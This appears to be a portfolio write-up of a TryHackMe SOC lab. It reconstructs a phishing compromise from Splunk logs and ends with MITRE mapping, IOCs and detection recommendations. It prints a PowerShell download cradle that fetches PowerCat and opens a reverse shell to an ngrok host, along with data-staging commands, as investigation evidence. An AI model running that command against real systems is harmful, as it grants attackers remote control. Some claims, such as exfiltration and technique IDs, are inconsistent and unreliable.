# 🛡️ DNS Exfiltration & PowerShell Abuse — SOC Investigation (TryHackMe Lab)

Advanced SOC Analysis • Detection Engineering • Incident Response
<h1></h1>

<h2>Executive Summary<h1></h1>
  
This investigation documents a simulated compromise discovered through Splunk and host-based telemetry.
The attacker used a phishing email to execute malicious PowerShell, bypass execution policies, perform internal Active Directory reconnaissance, and deploy a PowerCat reverse shell for command-and-control.

This lab demonstrates end‑to‑end SOC analysis at a mid‑ to senior‑level, including kill‑chain reconstruction, threat mapping, detection opportunities, and recommended containment actions.


![Attack chain( kill chain)drawio](https://github.com/user-attachments/assets/55fc708a-ed09-4f81-b83c-40af44bc51a2)



 <h2> Initial Access   
<h1></h1>
Phishing Email
Initial access to host computer Michael Ascot was through the phishing email here displayed in the Splunk Logs you can see the  attachment that compromised Michaels machine after opening it "ImportantInvoice-Feburary.zip" 
   
   The Hacker john@hatmakereurope.xyz with the unsual TLD of .xyz.

   After User opened malicious attachment it began downloading a "backdoor" silently within his download files allowing hacker to effectivly have a way in through this payload.

<img width="1920" height="1005" alt="poteintial area where hack started sender has suspicous TLD xyz" src="https://github.com/user-attachments/assets/f66545d1-d533-4d03-aa3c-37ebc763a999" />


<h2> Execution </h2>

<h1></h1>
  Powerview.ps1 downloaded
 Hacker used net.exe to do some recon within Localgroup. As seen in the file path created, he has downloaded Powerview.ps1  C:\Users\michael.ascot\Downloads\Powerview.ps1 a malicous tool to do reconisance and see user priveleges. 


<img width="1264" height="657" alt="attacker uses net to search local group finds michale and uses powerview" src="https://github.com/user-attachments/assets/f77f8ac6-eeaa-4fad-978d-9cf3f783e47a" />

<img width="1271" height="667" alt="usues sciptblock execution bypass to disable restrictions" src="https://github.com/user-attachments/assets/30b25128-76d1-4252-a5be-760cbe13e79d" />


 <h2> Discovery / Recon
  <h1></h1>
   Attacker uses Scriptblock text powershell - ExecutivePolicy bypassScript to disable Powershell restrictions. 
   Powerview runs Reflection checks to validate its enviornment and user permissions.
  
<img width="1920" height="1008" alt="powerview to enumerate DNSHostnames computerobjects LDAP put in file exfiltrateion " src="https://github.com/user-attachments/assets/4c4b9b6e-fad8-4aa6-a29b-d546eafe2043" />

Attacker begins to use Powerview to enumerate DNSHostname, LDP to qurey within the active directory(AD) to steal data
Also attacker finds sensitive Directory using net.exe under michael.ascot \\FILESRV-01\SSF-FinancialRecords

<img width="1920" height="1008" alt="find sesitive data FILESRV creates copy of user michael ascot folders" src="https://github.com/user-attachments/assets/56722ad9-c035-4f42-bddc-b4fa150f466d" />

Attacker copies files "Robocopy" to exfiltrate folder /E meaing everything including subfolders
C:\Windows\system32\Robocopy.exe" . C:\Users\michael.ascot\downloads\exfiltration /E


<img width="1920" height="1010" alt="deltes tracks places all files folder into exfilmezip then establishes DNS efiltration using nslookup to his hacker domain" src="https://github.com/user-attachments/assets/13fd95a4-a45c-4aab-aa4b-c687a34242aa" />

Attacker attempts to cover his tracks by deleting use z:
C:\Windows\system32\net.exe" use Z: /delete
compresses data within exfilt8me.zip to make transfering stolen data faster and less detectible
C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip

<img width="1920" height="1008" alt="using base64 to encode ZIP data through pipeline starting the dns exfiltration using nslookup to his domain" src="https://github.com/user-attachments/assets/a8403008-b700-4ee6-a6d6-fecb23ecdb40" />

Attacker begins DNS Exfiltration by taking the data he has stolen placed within the exfilt8me.zip using key tools like nslookup and  Base64 to encode and transfer the data to his domain _.haz4rdre.io taking advantage of the natural function of DNS as a way to transfer the stolen data to his domain.

<img width="1920" height="1010" alt="Large ammount of data exfiltration to his domain" src="https://github.com/user-attachments/assets/fd0a8ef0-8e3c-49ee-bff9-b9482cc2049f" />
Large amounts of data is stolen also attacker is using Powershell pipeline Execution used to exfiltrate.




 <h2> Command & Control</h2>
<h1></h1>
<img width="1274" height="644" alt="powercat downloaded from github" src="https://github.com/user-attachments/assets/19da7e2f-92bf-4ff4-b9b9-85be96f6a764" />
Attacker downloads Powercat from github as seen here
'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'

And then establishes and opens a reverse shell or Command & Control (c2) back to themselves over ngrok giving them full remote powershell access to michaels machine shown within the DownloadString below.

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell

PowerCat reverse shell:

powercat -c 2.tcp.ngrok.io -p 19282 -e powershell

🖼️ 📷 Insert Kill Chain Screenshot Here
📌 3. Timeline of Events
Time	Event	Description
T0	Email Received	Suspicious .xyz TLD sender
T1	User Opens Attachment	Important-Invoice-February.zip executed
T2	PowerShell Execution	ExecutionPolicy Bypass triggered
T3	LDAP/AD Recon	DNSHostName, LDAP queries, reflection checks
T4	PowerCat C2	Reverse shell connection attempted
T5	DNS Activity	DNS queries show enumeration
🖼️ 📷 Insert Timeline Screenshot Here
📌 4. Detailed Findings & Evidence
4.1 Phishing Email Delivery

Sender domain had unusual TLD (.xyz)

Contained malicious ZIP attachment

Likely initial compromise vector

📷 Insert Phishing Email Screenshot

4.2 Malicious PowerShell Execution

The attacker executed PowerShell with a bypass and fileless script execution:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell


This shows:

Script downloaded from GitHub (PowerCat)

Fileless execution via IEX

Reverse shell created for remote control

📷 Insert PowerShell Execution Screenshot

4.3 Active Directory & LDAP Enumeration

Attackers ran commands similar to PowerView:

Get-DomainComputer -Properties DNSHostName

LDAP queries across domain

AD object enumeration

Reflection‑based security checks

Purpose: map internal environment & identify targets.

📷 Insert AD Enumerati<img width="1920" height="1008" alt="powerview to enumerate DNSHostnames computerobjects LDAP put in file exfiltrateion " src="https://github.com/user-attachments/assets/34119feb-f709-484f-9156-850864faaa88" />
on Screenshot

4.4 Script Block Logging Evidence

Script Block Text captured exact commands executed:

DNSHostName queries

Recon scripts

PowerView function calls

Script Block Text = full transcript of attacker commands

📷 Insert ScriptBlock Screenshot

4.5 Reverse Shell (C2) Established
<img width="1274" height="644" alt="powercat downloaded from github" src="https://github.com/user-attachments/assets/6e4313e6-6884-4517-8237-03cee4fa3683" />

The key C2 command:

powercat -c 2.tcp.ngrok.io -p 19282 -e powershell


Indicates:

Outbound TCP session

Attacker-controlled host

Remote PowerShell session opened

📷 Insert Network C2 Screenshot

📌 5. MITRE ATT&CK Mapping
Phase	Technique	ID
Initial Access	Phishing	T1566
Execution	PowerShell	T1059.001
Defense Evasion	Execution Policy Bypass	T1620
Discovery	AD, LDAP, Host Discovery	T1087, T1069, T1018
Collection	Enumerating sensitive hostname data	T1005
C2	Reverse Shell (PowerCat)	T1105
Exfiltration	DNS-based mechanisms	T1048.003
📌 6. Indicators of Compromise (IOCs)
Domains:
- suspicious.xyz
- 2.tcp.ngrok.io

Files:
- Important-Invoice-February.zip
- powercat.ps1
- powerview.ps1

Processes:
- powershell.exe (ExecutionPolicy Bypass)
- net.exe / net1.exe

Network:
- Outbound TCP → ngrok C2 servers

📌 7. Impact Assessment

✔ Host was successfully compromised
✔ AD reconnaissance performed
✔ Internal network mapping attempted
✔ C2 channel created for remote access
✔ Potential for privilege escalation + lateral movement

No confirmed exfiltration, but attempted DNS-based collection was present.

📌 8. Containment & Remediation Actions
Immediate Containment

Isolate host from network

Terminate PowerShell sessions

Kill PowerCat reverse shell processes

Block outbound connections to attacker IPs

Disable compromised account

Remediation

Rotate credentials for affected users

Enable strict PowerShell logging

Block PowerCat signatures in EDR

Deploy DNS filtering policies

Harden mail filtering for uncommon TLDs

Detection Engineering

Alert on ExecutionPolicy bypass

Alert on IEX + WebClient script downloads

Alert on AD/LDAP bulk queries

Alert on outbound DNS to rare TLDs

🛡️ 9. My Response as a SOC Analyst (Senior-Level Perspective)

As the SOC analyst leading this investigation, I:

1. Correlated multi‑source telemetry

Analyzed PowerShell logs, DNS logs, Sysmon, and Splunk ingestion to reconstruct the kill chain.

2. Identified root cause

Phishing email attachment (Important-Invoice-February.zip) triggered initial compromise.

3. Verified execution method

Attackers used a fileless PowerShell download cradle to load PowerCat and PowerView into memory.

4. Assessed adversary objectives

Observed reconnaissance across AD, DNS hostname enumeration, and C2 setup indicating early‑stage lateral movement preparation.

5. Mapped techniques to MITRE

Aligned attack components with MITRE ATT&CK to confirm threat model and detection tuning requirements.

6. Recommended detection improvements

Designed new SIEM alerts for PowerShell bypass, DNS exfil patterns, LDAP enumeration, and malicious TLD communication.

7. Documented all IOCs & artifacts

Ensured SOC engineering and IR teams had actionable intelligence for future cases.

8. Delivered full incident report for leadership

Provided executive summary, impact analysis, and clear remediation roadmap.

📌 10. Conclusion

This investigation demonstrates advanced SOC skills including:

Incident reconstruction

PowerShell forensics

DNS exfiltration analysis

Threat hunting

MITRE mapping

Detection engineering

Senior-level documentation

This TryHackMe lab showcases readiness for Tier 2–Tier 3 SOC, Cloud Security Analyst, or CSIRT / IR roles.
